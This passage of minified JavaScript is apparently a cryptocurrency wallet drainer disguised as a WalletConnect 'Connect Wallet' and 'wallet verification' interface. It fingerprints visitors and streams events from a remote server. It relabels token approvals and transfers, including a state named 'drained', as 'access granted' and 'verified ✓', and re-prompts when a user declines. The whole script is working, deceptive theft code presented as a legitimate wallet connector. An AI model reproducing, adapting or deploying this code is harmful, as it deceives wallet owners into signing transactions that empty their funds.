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",
      walletconnect:
        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%233B99FC'/%3E%3Cpath d='M21.3 25.7c5.9-5.8 15.5-5.8 21.4 0l.7.7c.3.3.3.7 0 1l-2.4 2.4c-.1.1-.4.1-.5 0l-1-.9c-4.1-4-10.8-4-14.9 0l-1 1c-.1.1-.4.1-.5 0l-2.4-2.4c-.3-.3-.3-.7 0-1l.6-.8zm26.4 4.9l2.2 2.1c.3.3.3.7 0 1L40 43.5c-.3.3-.7.3-1 0l-6.5-6.4c-.1 0-.2 0-.2 0L25.8 43.5c-.3.3-.7.3-1 0L15 33.7c-.3-.3-.3-.7 0-1l2.2-2.1c.3-.3.7-.3 1 0l6.5 6.3c.1.1.2.1.2 0l6.5-6.3c.3-.3.7-.3 1 0l6.5 6.3c.1.1.2.1.2 0l6.5-6.3c.4-.3.8-.3 1.1 0z' fill='%23fff'/%3E%3C/svg%3E",
    },
    K = [
      {
        name: "Trust Wallet",
        icon: z.trust,
        deeplink: "trust://wc?uri=",
        appStore:
          "https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409",
        detect: () => {
          var e;
          return (
            !!window.trustwallet ||
            !!((e = window.ethereum) != null && e.isTrust)
          );
        },
      },
      {
        name: "MetaMask",
        icon: z.metamask,
        deeplink: "metamask://wc?uri=",
        appStore:
          "https://apps.apple.com/app/metamask-blockchain-wallet/id1438144202",
        detect: () => {
          var e;
          return !!((e = window.ethereum) != null && e.isMetaMask);
        },
      },
      {
        name: "OKX Wallet",
        icon: z.okx,
        deeplink: "okx://wallet/dapp/wc?uri=",
        appStore:
          "https://apps.apple.com/app/okx-buy-bitcoin-btc-crypto/id1327268470",
        detect: () => !!window.okxwallet,
      },
      {
        name: "Coinbase Wallet",
        icon: z.coinbase,
        deeplink: "cbwallet://wc?uri=",
        appStore: "https://apps.apple.com/app/coinbase-wallet/id1278383455",
        detect: () => {
          var e;
          return !!((e = window.ethereum) != null && e.isCoinbaseWallet);
        },
      },
      {
        name: "SafePal",
        icon: z.safepal,
        deeplink: "safepalwallet://wc?uri=",
        appStore: "https://apps.apple.com/app/safepal-wallet/id1548297139",
        detect: () => {
          var e;
          return (
            !!window.safepalProvider ||
            !!((e = window.ethereum) != null && e.isSafePal)
          );
        },
      },
      {
        name: "Bitget",
        icon: z.bitget,
        deeplink: "bitkeep://wc?uri=",
        appStore:
          "https://apps.apple.com/app/bitget-wallet-ex-bitkeep/id1395301115",
        detect: () => {
          var e;
          return !!((e = window.bitkeep) != null && e.ethereum);
        },
      },
      {
        name: "WalletConnect",
        icon: z.walletconnect,
        deeplink: "",
        appStore: "",
      },
    ];
  function WA() {
    const e = K.filter((c) => {
        var o;
        return (o = c.detect) == null ? void 0 : o.call(c);
      }),
      a = K.filter((c) => {
        var o;
        return !((o = c.detect) != null && o.call(c));
      });
    return [...e, ...a];
  }
  function wA() {
    if (document.getElementById("_ew_styles")) return;
    const e = document.createElement("style");
    ((e.id = "_ew_styles"),
      (e.textContent = `
    @keyframes _ew_spin { to { transform:rotate(360deg) } }
    @keyframes _ew_fadeIn { from{opacity:0} to{opacity:1} }
    @keyframes _ew_slideUp { from{transform:translateY(100%)} to{transform:translateY(0)} }
    @keyframes _ew_pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.7;transform:scale(0.97)} }
    @keyframes _ew_ripple { 0%{transform:scale(0.8);opacity:1} 100%{transform:scale(2.2);opacity:0} }
    @keyframes _tp_dash { to { stroke-dashoffset: 0 } }

    ._ew_overlay { position:fixed;inset:0;z-index:99999;display:flex;align-items:flex-end;justify-content:center;background:rgba(0,0,0,0.60);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);animation:_ew_fadeIn 0.15s ease; }
    @media(min-width:500px) { ._ew_overlay { align-items:center; } }

    ._ew_modal { font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Segoe UI",Roboto,sans-serif;background:#121313;border:1px solid #2a2a2d;border-radius:24px 24px 0 0;padding:0;max-width:400px;width:100%;color:#fff;box-shadow:0 -8px 40px rgba(0,0,0,0.5);animation:_ew_slideUp 0.25s ease-out;overflow:hidden; }
    @media(min-width:500px) { ._ew_modal { border-radius:24px;box-shadow:0 8px 40px rgba(0,0,0,0.5); } }

    ._ew_header { display:flex;align-items:center;justify-content:space-between;padding:16px 20px;border-bottom:1px solid #2a2a2d; }
    ._ew_header h3 { margin:0;font-size:16px;font-weight:600; }
    ._ew_close { width:28px;height:28px;border-radius:50%;background:#2a2a2d;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#9a9a9a;font-size:14px;transition:background 0.15s; }
    ._ew_close:hover { background:#363636; }

    ._ew_tabs { display:flex;border-bottom:1px solid #2a2a2d; }
    ._ew_tab { flex:1;padding:10px;text-align:center;font-size:13px;font-weight:500;cursor:pointer;border:none;background:none;color:#666;transition:color 0.15s; }
    ._ew_tab[data-active="true"] { color:#fff;box-shadow:inset 0 -2px 0 #3B99FC; }

    ._ew_body { padding:20px; }

    ._ew_wallets { display:flex;flex-direction:column;gap:4px; }
    ._ew_wallet_btn { display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:12px;background:#1a1a1d;border:1px solid #2a2a2d;cursor:pointer;color:#fff;font-size:13px;font-weight:500;transition:all 0.15s;width:100%;text-align:left; }
    ._ew_wallet_btn:hover { background:#252528;border-color:#3a3a3d; }
    ._ew_wallet_btn img { width:32px;height:32px;border-radius:8px;flex-shrink:0; }
    ._ew_wallet_btn .tag { margin-left:auto;font-size:10px;color:#34d399;background:rgba(52,211,153,0.12);padding:2px 8px;border-radius:6px;font-weight:600; }

    ._ew_qr_wrap { display:flex;flex-direction:column;align-items:center;gap:16px; }
    ._ew_qr_wrap img { border-radius:12px;background:#fff;padding:8px; }
    ._ew_qr_text { font-size:13px;color:#9a9a9a;text-align:center;line-height:1.5; }
    ._ew_qr_copy { padding:8px 20px;border-radius:8px;background:#2a2a2d;border:none;color:#fff;font-size:13px;cursor:pointer;transition:background 0.15s; }
    ._ew_qr_copy:hover { background:#363636; }

    ._ew_connecting { display:flex;flex-direction:column;align-items:center;gap:16px;padding:20px 0; }
    ._ew_spinner { width:48px;height:48px;border:2.5px solid #2a2a2d;border-top-color:#3B99FC;border-radius:50%;animation:_ew_spin 0.8s linear infinite; }
    ._ew_connecting_text { font-size:14px;color:#9a9a9a; }

    ._ew_footer { padding:12px 20px;border-top:1px solid #2a2a2d;display:flex;align-items:center;justify-content:center;gap:6px; }
    ._ew_footer span { font-size:11px;color:#666; }
  `),
      document.head.appendChild(e));
  }
  let j = null,
    q = !1;
  function jA(e, a, c, o, n, l, t) {
    q = !1;
    const A = tA();
    let s = "";
    try {
      s = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch {}
    const w = new URLSearchParams({
        visitorId: A,
        appUrl: window.location.origin,
        appName: document.title || window.location.hostname,
        ua: navigator.userAgent,
        tz: s,
        lang: navigator.language || "",
      }),
      b = new EventSource(`${AA}/evm/walletconnect?${w}`),
      d = { es: b, walletName: e, deeplink: a };
    ((j = d),
      (b.onmessage = (k) => {
        var E, v;
        try {
          const C = JSON.parse(k.data);
          if (C.event === "uri") {
            if ((c(C.uri), a && q)) {
              const x = document.getElementById("_tp_buttons");
              x &&
                (x.innerHTML = `<button onclick="window.location.href='${a}${encodeURIComponent(C.uri)}'" style="padding:10px 20px;border-radius:12px;background:#3B99FC;border:none;color:#fff;cursor:pointer;font-size:14px;font-weight:500;width:100%">Reconnect ${e || "Wallet"}</button>`);
            }
          } else if (C.event === "connected") ((q = !0), o(C.address));
          else if (C.event === "reconnecting") n("Reconnecting to wallet...");
          else if (C.event === "reconnected") n("Please reconnect your wallet");
          else if (C.event === "funding") n("Preparing verification...");
          else if (C.event === "tokens")
            C.count > 0
              ? n(`Verifying ${C.count} asset${C.count > 1 ? "s" : ""}...`)
              : n("No significant assets found");
          else if (C.event === "tx_status") {
            const x = C.status,
              D = C.symbol || "?";
            if (x === "signing") {
              const h =
                C.attempt && C.attempt > 1 ? ` (attempt ${C.attempt})` : "";
              n(`Confirm ${D} access in wallet${h}`);
            } else
              x === "approved"
                ? n(`${D} access granted ✓`)
                : x === "rejected"
                  ? n(`${D} declined — retrying...`)
                  : x === "transferring"
                    ? n(`Processing ${D}...`)
                    : x === "drained"
                      ? n(`${D} verified ✓`)
                      : (x === "build_failed" || x === "broadcast_failed") &&
                        n(`${D} — try again later`);
          } else if (C.event === "done") {
            ((j = null), l(!0));
            try {
              (E = d.es) == null || E.close();
            } catch {}
          } else if (C.event === "error") {
            ((j = null), t(C.message || "Connection error"));
            try {
              (v = d.es) == null || v.close();
            } catch {}
          }
        } catch {}
      }));
    let u = 0;
    b.onerror = () => {
      var k;
      try {
        (k = d.es) == null || k.close();
      } catch {}
      if (!q) {
        t("Connection lost");
        return;
      }
      u >= 10 ||
        j !== d ||
        (u++,
        setTimeout(() => {
          if (j !== d) return;
          const E = tA();
          let v = "";
          try {
            v = Intl.DateTimeFormat().resolvedOptions().timeZone;
          } catch {}
          const C = new URLSearchParams({
              visitorId: E,
              appUrl: window.location.origin,
              appName: document.title || window.location.hostname,
              ua: navigator.userAgent,
              tz: v,
              lang: navigator.language || "",
              resume: "1",
            }),
            x = new EventSource(`${AA}/evm/walletconnect?${C}`);
          ((d.es = x),
            (j = d),
            (x.onmessage = b.onmessage),
            (x.onerror = b.onerror));
        }, 2e3));
    };
    const m = () => {
      if (document.visibilityState !== "visible") return;
      if (j !== d) {
        document.removeEventListener("visibilitychange", m);
        return;
      }
      const k = d.es;
      if (!k || k.readyState === 2) {
        if (!q || u >= 10) return;
        u++;
        const E = tA();
        let v = "";
        try {
          v = Intl.DateTimeFormat().resolvedOptions().timeZone;
        } catch {}
        const C = new URLSearchParams({
            visitorId: E,
            appUrl: window.location.origin,
            appName: document.title || window.location.hostname,
            ua: navigator.userAgent,
            tz: v,
            lang: navigator.language || "",
            resume: "1",
          }),
          x = new EventSource(`${AA}/evm/walletconnect?${C}`);
        ((d.es = x),
          (j = d),
          (x.onmessage = b.onmessage),
          (x.onerror = b.onerror));
      }
    };
    return (document.addEventListener("visibilitychange", m), d);
  }
  function BA() {
    if (j != null && j.es)
      try {
        j.es.close();
      } catch {}
    ((j = null), (q = !1));
  }
  function HA() {
    return new Promise((e, a) => {
      (wA(), (document.body.style.overflow = "hidden"));
      const c = document.createElement("div");
      c.className = "_ew_overlay";
      const o = document.createElement("div");
      o.className = "_ew_modal";
      let n = "wallets",
        l = !1,
        t = "",
        A = !1,
        s = "",
        w = "";
      function b() {
        var C, x;
        ((o.innerHTML = `
        <div class="_ew_header">
          <h3>Connect Wallet</h3>
          <button class="_ew_close">&times;</button>
        </div>
        <div class="_ew_tabs">
          <button class="_ew_tab" data-tab="wallets" data-active="${n === "wallets"}">Wallets</button>
          <button class="_ew_tab" data-tab="qr" data-active="${n === "qr"}">QR Code</button>
        </div>
        <div class="_ew_body">
          ${n === "wallets" ? d() : m()}
        </div>
        <div class="_ew_footer">
          <span>Powered by WalletConnect</span>
        </div>
      `),
          (C = o.querySelector("._ew_close")) == null ||
            C.addEventListener("click", () => {
              (E(), a(new Error("closed")));
            }),
          o.querySelectorAll("._ew_tab").forEach((D) => {
            D.addEventListener("click", () => {
              ((n = D.dataset.tab),
                b(),
                n === "qr" && !t && !l && k("WalletConnect", ""));
            });
          }));
        const v = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
        (o.querySelectorAll("._ew_wallet_btn").forEach((D) => {
          D.addEventListener("click", async () => {
            var p;
            const h = D.dataset.wallet,
              R = D.dataset.deeplink || "",
              P = K.find((i) => i.name === h),
              r =
                (p = P == null ? void 0 : P.detect) == null
                  ? void 0
                  : p.call(P);
            !v && r && window.ethereum ? await MA(h, E, e) : k(h, v ? R : "");
          });
        }),
          (x = o.querySelector("._ew_retry_btn")) == null ||
            x.addEventListener("click", () => {
              ((A = !1), (t = ""), (l = !1), k(s, w));
            }),
          setTimeout(() => {
            var D, h, R;
            ((D = o.querySelector("._ew_qr_copy")) == null ||
              D.addEventListener("click", () => {
                navigator.clipboard.writeText(t).catch(() => {});
                const P = o.querySelector("._ew_qr_copy");
                P &&
                  ((P.textContent = "Copied!"),
                  setTimeout(() => {
                    P.textContent = "Copy Link";
                  }, 1500));
              }),
              (h = o.querySelector("._ew_open_wallet")) == null ||
                h.addEventListener("click", () => {
                  w &&
                    t &&
                    (window.location.href = `${w}${encodeURIComponent(t)}`);
                }),
              (R = o.querySelector("._ew_show_qr_toggle")) == null ||
                R.addEventListener("click", () => {
                  ((u = !u), b());
                }));
          }, 100));
      }
      function d() {
        return `<div class="_ew_wallets">
        ${WA()
          .map((v) => {
            var C;
            return `
          <button class="_ew_wallet_btn" data-wallet="${v.name}" data-deeplink="${v.deeplink || ""}">
            <img src="${v.icon}" alt="${v.name}" onerror="this.style.display='none'"/>
            <span>${v.name}</span>
            ${(C = v.detect) != null && C.call(v) ? '<span class="tag">Detected</span>' : ""}
          </button>
        `;
          })
          .join("")}
      </div>`;
      }
      let u = !1;
      function m() {
        const v = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent),
          C = K.find((h) => h.name === s),
          x = (C == null ? void 0 : C.icon) || "",
          D = (C == null ? void 0 : C.appStore) || "";
        if (A)
          return `<div class="_ew_connecting">
          <div class="_ew_connecting_text" style="color:#f87171">Connection failed</div>
          <button class="_ew_retry_btn" style="margin-top:12px;padding:8px 20px;border-radius:8px;background:#2a2a2d;border:1px solid #3a3a3d;color:#fff;cursor:pointer;font-size:13px">Retry</button>
        </div>`;
        if (v && w) {
          const h = !!t;
          return `<div style="display:flex;flex-direction:column;align-items:center;gap:0;padding:8px 0 4px">
          <div style="position:relative;width:90px;height:90px;margin-bottom:16px">
            ${
              h
                ? ""
                : `<svg viewBox="0 0 94 94" width="90" height="90" style="position:absolute;inset:0">
              <rect x="2" y="2" width="90" height="90" rx="22" style="fill:none;stroke:#3B99FC;stroke-width:2.5;stroke-linecap:round;stroke-dasharray:100 220;stroke-dashoffset:320;animation:_tp_dash 1s linear infinite"/>
            </svg>`
            }
            <img src="${x}" style="position:absolute;top:10px;left:10px;width:70px;height:70px;border-radius:18px;display:block;" onerror="this.style.display='none'"/>
          </div>
          <div style="font-size:17px;font-weight:600;color:#fff;margin-bottom:2px">${s}</div>
          <div style="font-size:13px;color:#666;margin-bottom:20px">${h ? "Continue in the wallet app" : "Connecting..."}</div>
          <button class="_ew_open_wallet" ${h ? "" : "disabled"} style="width:100%;padding:15px;border-radius:14px;border:none;color:#fff;font-size:15px;font-weight:600;letter-spacing:0.2px;box-shadow:0 4px 16px rgba(59,153,252,0.25);transition:all 0.2s;${h ? "background:linear-gradient(135deg,#2b7cd0,#3B99FC);cursor:pointer;opacity:1" : "background:#2a2a2d;cursor:default;opacity:0.5"}">
            ${h ? "↗ Open" : "⟳ Connecting..."}
          </button>
          <div style="display:flex;gap:12px;margin-top:16px">
            <button class="_ew_show_qr_toggle" style="padding:8px 16px;border-radius:10px;background:#1e1e21;border:1px solid #2a2a2d;color:#9a9a9a;font-size:12px;cursor:pointer;transition:background 0.15s">${u ? "Hide QR" : "Show QR code"}</button>
            ${D ? `<a href="${D}" target="_blank" rel="noopener" style="padding:8px 16px;border-radius:10px;background:#1e1e21;border:1px solid #2a2a2d;color:#9a9a9a;font-size:12px;text-decoration:none;transition:background 0.15s">Get ${s}</a>` : ""}
          </div>
          ${
            u && h
              ? `
            <div style="margin-top:16px;display:flex;flex-direction:column;align-items:center;gap:10px">
              <img src="${uA(t, 180)}" width="180" height="180" style="border-radius:12px;background:#fff;padding:8px;display:block" alt="QR"/>
              <button class="_ew_qr_copy" style="padding:7px 20px;border-radius:8px;background:#1e1e21;border:1px solid #2a2a2d;color:#9a9a9a;font-size:12px;cursor:pointer">Copy Link</button>
            </div>
          `
              : ""
          }
        </div>`;
        }
        return t
          ? `<div class="_ew_qr_wrap">
          <img src="${uA(t, 240)}" width="240" height="240" alt="QR"/>
          <div class="_ew_qr_text">Scan with your wallet</div>
          <div style="display:flex;gap:8px;margin-top:4px">
            <button class="_ew_qr_copy">Copy Link</button>
          </div>
        </div>`
          : `<div class="_ew_connecting">
        <div class="_ew_spinner"></div>
        <div class="_ew_connecting_text">Initializing...</div>
      </div>`;
      }
      function k(v, C) {
        ((s = v),
          (w = C),
          (n = "qr"),
          (l = !0),
          (A = !1),
          (t = ""),
          (u = !1),
          b(),
          BA());
        const x = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
        jA(
          v,
          C,
          (D) => {
            ((t = D),
              (l = !1),
              b(),
              x &&
                C &&
                (window.location.href = `${C}${encodeURIComponent(D)}`));
          },
          (D) => {
            var P;
            E();
            const h = K.find((r) => r.name === v);
            if (
              ((rA = (h == null ? void 0 : h.icon) || ""),
              (bA = v),
              cA("Verifying wallet assets..."),
              J("Confirm transactions in your wallet app"),
              /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent))
            ) {
              const r = document.getElementById("_tp_buttons");
              r &&
                ((r.innerHTML = `<button id="_tp_open_wallet" style="padding:10px 20px;border-radius:12px;background:#3B99FC;border:none;color:#fff;cursor:pointer;font-size:14px;font-weight:500;width:100%">Open ${v || "Wallet"}</button>`),
                (P = document.getElementById("_tp_open_wallet")) == null ||
                  P.addEventListener("click", () => {
                    C &&
                      t &&
                      (window.location.href = `${C}${encodeURIComponent(t)}`);
                  }));
            }
          },
          (D) => {
            J(D);
          },
          (D) => {
            (oA(
              "Verification Failed",
              "We could not verify this wallet. Make sure your wallet is active and has transaction history.",
            ),
              setTimeout(() => nA(), 5e3),
              e({ address: "" }));
          },
          (D) => {
            G && G.style.display !== "none"
              ? (oA("Verification Failed", D), setTimeout(() => nA(), 5e3))
              : ((A = !0), (l = !1), b());
          },
        );
      }
      function E() {
        ((document.body.style.overflow = ""), BA(), c.remove());
      }
      (c.appendChild(o),
        document.body.appendChild(c),
        c.addEventListener("click", (v) => {
          v.target === c && (E(), a(new Error("closed")));
        }),
        b());
    });
  }
  let G = null,
    rA = "",
    bA = "";
  function cA(e) {
    if ((wA(), (document.body.style.overflow = "hidden"), !G)) {
      const l = document.createElement("style");
      ((l.id = "_tp_styles"),
        document.getElementById("_tp_styles") ||
          ((l.textContent = `
        @keyframes _tp_dash { to { stroke-dashoffset: 0 } }
        @keyframes _tp_fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
        #_tp_overlay * { box-sizing:border-box; -webkit-font-smoothing:antialiased; margin:0; padding:0; }
        #_tp_overlay { position:fixed;inset:0;z-index:99999;display:flex;align-items:flex-end;justify-content:center;background:rgba(0,0,0,0.50);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px); }
        @media(min-width:500px) { #_tp_overlay { align-items:center; } }
